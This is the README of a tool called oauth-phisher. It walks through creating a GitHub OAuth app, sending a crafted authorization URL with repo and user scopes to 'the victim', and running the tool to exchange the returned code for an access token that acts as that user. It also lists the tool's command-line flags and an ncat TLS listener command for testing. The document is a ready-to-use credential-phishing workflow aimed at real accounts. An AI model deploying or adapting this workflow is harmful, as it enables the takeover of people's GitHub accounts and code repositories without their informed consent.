# OAuth Phisher

Got a GitHub OAuth app? What happens if someone authorizes it? Works for multiple OAuth providers.

Send a user the auth URL and use this to easily get an access token

You'll want a valid Lets Encrypt certificate

### Pre-req

1. Create an GitHub OAuth App. Also works with GitHub Apps
2. Record your ClientID, Client Secret, Redirect URI
3. Send the authorization URL to the victim
  1. `https://github.com/login/oauth/authorize?client_id=<yourclientID>&redirect_url=https://github.com&scope=repo,user&state=thesubtlety-oauth-phisher`
4. Run `oauth-phisher` to recieve the code and obtain an auth token as the user

## Usage
```
oauth-phisher \
  -cert /etc/letsencrypt/live/example.com/fullchain.pem \ 
  -key /etc/letsencrypt/live/example.com/privkey.pem \
  -client-id [clientid] \
  -client-secret "[secret]" \
  -redirect-uri "[thishost]/callback"
  

Usage of ./oauth-phisher:
  -api string
        API URL (default "https://api.github.com")
  -callback-path string
        app callback path (default "/callback")
  -cert string
        path to cert file
  -client-id string
         ClientID
  -client-secret string
         Client Secret
  -key string
        path to key file
  -oauth string
        oauth access token endpoint (default "https://github.com/login/oauth/access_token")
  -port string
        port to serve on (default "443")
  -redir string
        where to send the user after adding the oauth app (default "https://github.com")
  -redirect-uri string
         Redirect URL
```

### Testing
```
ncat -lvp 443 --ssl-key /etc/letsencrypt/live/example.com/privkey.pem --ssl-cert /etc/letsencrypt/live/example.com/fullchain.pem
```